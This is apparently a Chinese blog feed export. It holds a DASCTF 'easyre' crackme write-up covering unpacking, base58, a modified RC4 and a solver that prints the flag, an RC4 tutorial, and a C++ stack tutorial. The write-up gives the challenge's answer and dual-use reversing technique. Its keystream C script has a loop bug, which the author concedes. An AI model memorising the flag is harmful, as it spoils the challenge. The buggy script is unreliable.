<h1 id="DASCTF三月春季挑战赛"><a href="#DASCTF三月春季挑战赛" class="headerlink" title="DASCTF三月春季挑战赛"></a>DASCTF三月春季挑战赛</h1><h5 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h5><p>查壳</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221230165238825.png" class title="This is an image">

<p>发现有壳，用esp定律可以很快脱壳</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221230172541689.png" class title="This is an image">

<p>在这个位置把程序dump出来</p>
<p>主逻辑：</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221230170601273.png" class title="This is an image">

<p>经过分析，大致逻辑：</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221230170840417.png" class title="This is an image">

<p>也就是对我们输入的flag先作两个判断，看是不是长度为42，flag头为DASCTF{}</p>
<p>然后进行两种方式的加密处理，很明显有一种得出的flag是假的</p>
<p>跟进函数sub_4019BE，发现是一个base58</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221230171241637.png" class title="This is an image">

<p>跟进另一个加密函数sub_401771，发现是一个魔改的RC4加密</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221230171540200.png" class title="This is an image">

<p>密文已经给出来了，就是数组v2，所以我们只要想办法将密钥流（dword_492940）拿到就行</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221230171906728.png" class title="This is an image">

<p>通过OD动调获取</p>
<p>自行构造一个字符串输入</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221230172723496.png" class title="This is an image">

<p>F7进入函数401771，再进入函数401619，因为最后使用密钥的位置在这个函数里</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221230173003830.png" class title="This is an image">

<p>然后这个key的地址是40174E，在这里设置断点,就可以获取密钥流的值</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221230173151987.png" class title="This is an image">

<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221230173654733.png" class title="This is an image">

<p>最后exp</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> enflag[] = &#123; <span class="number">0xC3</span>,<span class="number">0x80</span>,<span class="number">0xd5</span>,<span class="number">0xf2</span>,<span class="number">0x9b</span>,<span class="number">0x30</span>,<span class="number">0xb</span>,<span class="number">0xb4</span>,<span class="number">0x55</span>,<span class="number">0xde</span>,<span class="number">0x22</span>,<span class="number">0x83</span>,<span class="number">0x2f</span>,<span class="number">0x97</span>,</span><br><span class="line">      <span class="number">0xb8</span>,<span class="number">0x20</span>,<span class="number">0x1d</span>,<span class="number">0x74</span>,<span class="number">0xd1</span>,<span class="number">1</span>,<span class="number">0x73</span>,<span class="number">0x1a</span>,<span class="number">0xb2</span>,<span class="number">0xc8</span>,<span class="number">0xc5</span>,<span class="number">0x74</span>,<span class="number">0xc0</span>,<span class="number">0x5b</span>,</span><br><span class="line">      <span class="number">0xf7</span>,<span class="number">0xf</span>,<span class="number">0xd3</span>,<span class="number">1</span>,<span class="number">0x55</span>,<span class="number">0xb2</span>,<span class="number">0xa4</span>,<span class="number">0xae</span>,<span class="number">0x7b</span>,<span class="number">0xac</span>,<span class="number">0x5c</span>,<span class="number">0x56</span>,<span class="number">0xbc</span>,<span class="number">0x23</span> &#125;;</span><br><span class="line">    <span class="type">int</span> xorKey[] = &#123; <span class="number">0x38</span>,<span class="number">0x78</span>,<span class="number">0xdd</span>,<span class="number">0xe8</span>,<span class="number">0</span>,<span class="number">0xaf</span>,<span class="number">0xbf</span>,<span class="number">0x3a</span>,<span class="number">0x6b</span>,<span class="number">0xFB</span>,<span class="number">0xB8</span>,<span class="number">0x0C</span>,<span class="number">0x85</span>,<span class="number">0x35</span>,</span><br><span class="line">      <span class="number">0x5C</span>,<span class="number">0xAD</span>,<span class="number">0xe6</span>,<span class="number">0</span>,<span class="number">0xe0</span>,<span class="number">0x8a</span>,<span class="number">0x1d</span>,<span class="number">0xbd</span>,<span class="number">0x46</span>,<span class="number">0xd2</span>,<span class="number">0x2b</span>,<span class="number">0</span>,<span class="number">0x15</span>,<span class="number">0x24</span></span><br><span class="line">      ,<span class="number">0xc6</span>,<span class="number">0xad</span>,<span class="number">0xa1</span>,<span class="number">0xc9</span>,<span class="number">0x7b</span>,<span class="number">0x12</span>,<span class="number">0x28</span>,<span class="number">0</span>,<span class="number">0x05</span>,<span class="number">0</span>,<span class="number">0x72</span>,<span class="number">0x3e</span>,<span class="number">0x10</span>,<span class="number">0xa1</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, xorKey[i] ^ (enflag[i] - <span class="number">71</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//DASCTF&#123;Welc0me-t0-j01n-SU-l0ve-suyug1eg1e&#125;</span></span><br></pre></td></tr></table></figure>

<p>这里提取数据的时候，可以使用ida脚本，分两次取，快捷键是shift+F2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;idc.idc&gt;</span><br><span class="line">static main()</span><br><span class="line">&#123;</span><br><span class="line">    auto addr=0x401801;</span><br><span class="line">    auto i;</span><br><span class="line">    for(i=addr;i&lt;0x4018E1;i=i+10)</span><br><span class="line">    &#123;</span><br><span class="line">        Message(&quot;0x%X,&quot;,Byte(i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xC3,0x80,0xD5,0xF2,0x9B,0x30,0xB,0xB4,0x55,0xDE,0x22,0x83,0x2F,0x97,0xB8,0x20,0x1D,0x74,0xD1,0x1,0x73,0x1A,0xB2,</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221230180134840.png" class title="This is an image">

<p>另外一段数据同理</p>
<h2 id="补充一下RC4算法"><a href="#补充一下RC4算法" class="headerlink" title="补充一下RC4算法"></a>补充一下RC4算法</h2><h3 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h3><p>RC4生成一种称为密钥流的伪随机流，通过异或操作混合，以达到加密的目的，解密时与密文进行异或操作。其密钥流由两部分组成，分别是KSA和PRGA。</p>
<h4 id="KSA"><a href="#KSA" class="headerlink" title="KSA"></a>KSA</h4><p>RC4首先使用密钥调度算法（KSA）完成对大小为256字节的数组S的初始化及替换，在替换时使用密钥。其密钥长度一般取5-16字节（40-128位），通常不超过256位。先用0-255初始化数组S，再使用密钥进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i=0 to 255 do  </span><br><span class="line">S[i]=i;            //用0~255初始化状态矢量</span><br><span class="line">//用给定密钥Key初始化密钥数据K[i],Key的长度不够时将循环使用</span><br><span class="line">K[i]=Key[i mod L];</span><br><span class="line">j=0;</span><br><span class="line">for i=0 to 255 do</span><br><span class="line">j=(j+S[i]+K[i])mod 256;</span><br><span class="line">swap(S[i],S[j]);</span><br></pre></td></tr></table></figure>



<h4 id="PRGA（主要完成流的生成）"><a href="#PRGA（主要完成流的生成）" class="headerlink" title="PRGA（主要完成流的生成）"></a>PRGA（主要完成流的生成）</h4><p>数组S在完成初始化后，便不再使用输入的密钥。密钥流的生成是从S[0]到S[255]的。密钥流中的密钥K被一个一个生成，即从S[0]到S[255]，对每个S[i],根据当前态S的值，将S[i]与S中的另一个元素(字节)置换。当S[255]完成置换后，操作再从S[0]开始重复。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i=0;</span><br><span class="line">j=0;</span><br><span class="line">while(true)//有字节需要加密</span><br><span class="line">i=(i+1) mod 256;</span><br><span class="line">j=(j+S[i]) mod 256;</span><br><span class="line">swap(S[i],	S[j]);</span><br><span class="line">t=(S[i]+S[j])mod256;</span><br><span class="line">k=S[t];</span><br></pre></td></tr></table></figure>

<p>加密是将K与下一明文字节异或；解密是加密的逆过程，即将K的值与下一密文字节异或</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>算法主要关键在于S的初始化和流的生成</p>
<p><strong>S的初始化</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个过程处理是由以下步骤组成：</span><br><span class="line">（1）选取一个长度为1~ 256个字节的密钥K。</span><br><span class="line">（2）设置状态向量S的值等于0~ 255（以递增的顺序），也就是说S[0]=0，S[1]=1，…，S[255]=255。</span><br><span class="line">（3）创建临时数组，如果密钥K的长度是256个字节，那么把K复制到S。否则，在把K复制到临时数组后，临时数组的剩余位置再次用K的值进行填充，最后，临时数组必须完全填满。</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20220928231458357.png" class title="This is an image">

<p>这里的T就是临时数组，T的输出就是256&#x2F;7个Key</p>
<p>再进行初始置换，位于S[i]的字节与S数组的另一个字节(由T[i]决定)进行交换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">swap_S</span>(): </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        tmp = S[i]</span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = tmp</span><br></pre></td></tr></table></figure>

<p><strong>流的生成</strong></p>
<p>经过以上的初始化和置换以后，S已经准备好了，初始的密钥数组K可以丢弃了。现在我们需要另一个循环。在每一步中，我们把S[i]与S的另一个字节进行交换，每次交换的方法由S的实现来决定。一旦用完了256个位置后，在从S[i]开始，逻辑代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">j, t = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(txtlen):</span><br><span class="line">        i = i % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        tmp = S[i]</span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = tmp</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        KeyStream.append(S[t])</span><br></pre></td></tr></table></figure>

<p>最后进行异或运算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">      res.append(<span class="built_in">ord</span>(flag[i]) ^ KeyStream[i])</span><br></pre></td></tr></table></figure>

<p>完整代码py实现如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">init_S</span>():  <span class="comment">#初始化S盒</span></span><br><span class="line">    <span class="keyword">global</span> S</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        S.append(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_T</span>():   <span class="comment">#初始化T盒(临时数组)</span></span><br><span class="line">    <span class="keyword">global</span> Key  <span class="comment">#用给定密钥Key初始化密钥数据T[i],Key的长度不够时将循环使用</span></span><br><span class="line">    <span class="keyword">global</span> T</span><br><span class="line">    Key = <span class="string">&#x27;abcdefg&#x27;</span></span><br><span class="line">    keylen = <span class="built_in">len</span>(Key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        tmp = Key[(i % keylen)] <span class="comment">#循环使用</span></span><br><span class="line">        T.append(tmp)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap_S</span>():  <span class="comment">#根据key对S盒相应的元素进行互换，经过256次循环得到的S盒代入之后的加密过程</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        tmp = S[i]</span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_KeyStream</span>():  <span class="comment">#得到密钥流 PRGA</span></span><br><span class="line">    <span class="keyword">global</span> KeyStream</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    txtlen = <span class="built_in">len</span>(flag)</span><br><span class="line">    j, t = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(txtlen):</span><br><span class="line">        i = i % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        tmp = S[i]</span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = tmp</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        KeyStream.append(S[t])</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_code</span>():  <span class="comment">#加密，将T与下一明文字节异或，flag即为明文</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        res.append(<span class="built_in">ord</span>(flag[i]) ^ KeyStream[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    T, S, Key = [], [], []</span><br><span class="line">    PlainText, CryptoText, KeyStream = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, []</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;please input you flag:\n&#x27;</span>)<span class="comment">#输入明文</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;bad&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    init_S()</span><br><span class="line">    init_T()</span><br><span class="line">    swap_S()</span><br><span class="line">    Get_KeyStream()</span><br><span class="line">    res = Get_code()</span><br><span class="line">    <span class="built_in">print</span>(res)  <span class="comment">#得到加密后的密文了</span></span><br><span class="line">    <span class="keyword">for</span> i, ele <span class="keyword">in</span> <span class="built_in">enumerate</span>(res):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ele == [<span class="number">84</span>, <span class="number">91</span>, <span class="number">254</span>, <span class="number">48</span>, <span class="number">129</span>, <span class="number">210</span>, <span class="number">135</span>, <span class="number">132</span>, <span class="number">112</span>, <span class="number">234</span>, <span class="number">208</span>, <span class="number">15</span>, <span class="number">213</span>, <span class="number">39</span>, <span class="number">108</span>, <span class="number">253</span>, <span class="number">86</span>, <span class="number">118</span>, <span class="number">248</span>][i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;bad&#x27;</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;good&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>上面例子中函数sub_401500，其实就是一个S盒的初始化</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221231171129838.png" class title="This is an image">

<p>函数sub_40152B，是一个密钥盒的初始化</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221231171418697.png" class title="This is an image">

<p>函数sub_401593，对S盒进行了一个处理</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221231174840336.png" class title="This is an image">

<p>函数sub_401619，密钥流的生成</p>
<img src="/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20221231181015652.png" class title="This is an image">

<p>所以其实可以写脚本，把密钥流算出来</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> S[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;; </span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> T[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> key[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">	<span class="type">int</span> klen = <span class="built_in">strlen</span>(key);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> xorKey[<span class="number">42</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> tmp=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  <span class="comment">//初始化S盒和T盒</span></span><br><span class="line">	&#123;</span><br><span class="line">		S[i] = i;</span><br><span class="line">		T[i] = key[i % klen];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		j = (j + S[i] + T[i]) % <span class="number">256</span>;</span><br><span class="line">		tmp = S[i];</span><br><span class="line">		S[i] = S[j];</span><br><span class="line">		S[j] = tmp;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//流的生成</span></span><br><span class="line">	<span class="type">int</span> v4, count, v5 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (count = <span class="number">0</span>; count &lt; <span class="number">42</span>; count++)</span><br><span class="line">	&#123;</span><br><span class="line">		i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">		j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">		v4 = S[i] + <span class="number">66</span>;</span><br><span class="line">		S[i] = S[j] - <span class="number">33</span>;</span><br><span class="line">		S[i] ^= <span class="number">2u</span>;</span><br><span class="line">		S[j] = <span class="number">5</span> * v4;</span><br><span class="line">		S[j] = S[i] - <span class="number">10</span>;</span><br><span class="line">		S[j] += S[i];</span><br><span class="line">		S[i] -= <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">		xorKey[v5++] = S[(S[j] + S[i]) % <span class="number">256</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%X,&quot;</span>, xorKey[i]);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但这里由于运行的编译器版本不同，结果是不同的，所以还是动调把数据拉出来比较好。感谢PZ师傅的指导，不然也不会这么快复现出来。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>栈</title>
    <url>/2023/01/24/%E6%A0%88/</url>
    <content><![CDATA[<h2 id="什么是栈"><a href="#什么是栈" class="headerlink" title="什么是栈"></a>什么是栈</h2><p>栈是一种先进后出的数据结构， 就好比我们生活中的乒乓球桶， 只有一端开口。它按照先进后出的原则存储数据，先进入的数据被压入栈底，最后的数据在栈顶，需要读数据的时候从栈顶开始弹出数据（最后一个数据被第一个读出来）。 我们学习递归的时候， 在计算机内部就是用栈实现的递归。在计算机中，它是一种运算受限的线性表。其限制是仅允许在表的一端进行插入和删除运算，这一端被称为栈顶，相对地，把另一端称为栈底。</p>
<h2 id="写一个栈"><a href="#写一个栈" class="headerlink" title="写一个栈"></a>写一个栈</h2><table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">函数</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">入栈</td>
<td align="left">push(x)</td>
<td align="left">将x元素入栈</td>
</tr>
<tr>
<td align="left">出栈</td>
<td align="left">pop()</td>
<td align="left">弹出栈的第一个元素，返回值为栈顶元素值</td>
</tr>
<tr>
<td align="left">元素个数</td>
<td align="left">size()</td>
<td align="left">获取栈中的元素个数，返回int</td>
</tr>
<tr>
<td align="left">获取栈顶元素</td>
<td align="left">top()</td>
<td align="left">获取栈顶元素的值</td>
</tr>
</tbody></table>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxN = <span class="number">100000</span>;</span><br><span class="line"><span class="type">int</span> st[MaxN + <span class="number">5</span>];</span><br><span class="line"><span class="type">int</span> total;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	total = total + <span class="number">1</span>;</span><br><span class="line">	st[total] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> value = st[total];</span><br><span class="line">	total = total - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">size</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> st[total];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">push</span>(<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">push</span>(<span class="number">5</span>);</span><br><span class="line">	<span class="built_in">push</span>(<span class="number">6</span>);</span><br><span class="line">	<span class="built_in">push</span>(<span class="number">10</span>);</span><br><span class="line">	cout &lt;&lt; <span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="built_in">pop</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="built_in">top</span>() &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="stack的基本操作"><a href="#stack的基本操作" class="headerlink" title="stack的基本操作"></a>stack的基本操作</h2><p>在 C++ 的标准库中， 有封装好的栈 stack ，stack是一个模板类，定义的示例代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">stack&lt;类型&gt; 对象：</span><br><span class="line">stack&lt;<span class="type">int</span>&gt;  s;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">代码</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">入栈</td>
<td align="left">s.push(x)</td>
<td align="left">将x元素入栈</td>
</tr>
<tr>
<td align="left">出栈</td>
<td align="left">s.pop()</td>
<td align="left">弹出栈的第一个元素，并不会返回元素的值</td>
</tr>
<tr>
<td align="left">栈顶元素</td>
<td align="left">s.top()</td>
<td align="left">获取栈的第一个元素</td>
</tr>
<tr>
<td align="left">元素个数</td>
<td align="left">s.size()</td>
<td align="left">获取栈中的元素个数，返回int</td>
</tr>
<tr>
<td align="left">判空</td>
<td align="left">s.empty()</td>
<td align="left">栈是否为空，返回bool，相当于s.size() &#x3D;&#x3D; 0</td>
</tr>
</tbody></table>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="操作栈"><a href="#操作栈" class="headerlink" title="操作栈"></a>操作栈</h3><p>有一个初始为空的栈，我们对这个栈进行 n 次操作，操作共分为 2 种：</p>
<p>1.1x （将数字 x 放入栈）</p>
<p>2.2 （将栈顶元素弹出）</p>
<p>对于第 2 种操作，你需要把弹出的这个数字输出，如果进行操作 2 时，栈为空，则输出” empty” 。</p>
<p>例如： n&#x3D;5 ，对应的操作为：</p>
<p>1123 （操作后栈里面的元素为： 123 ）</p>
<p>1234 （操作后栈里面的元素为： 123,234 ）</p>
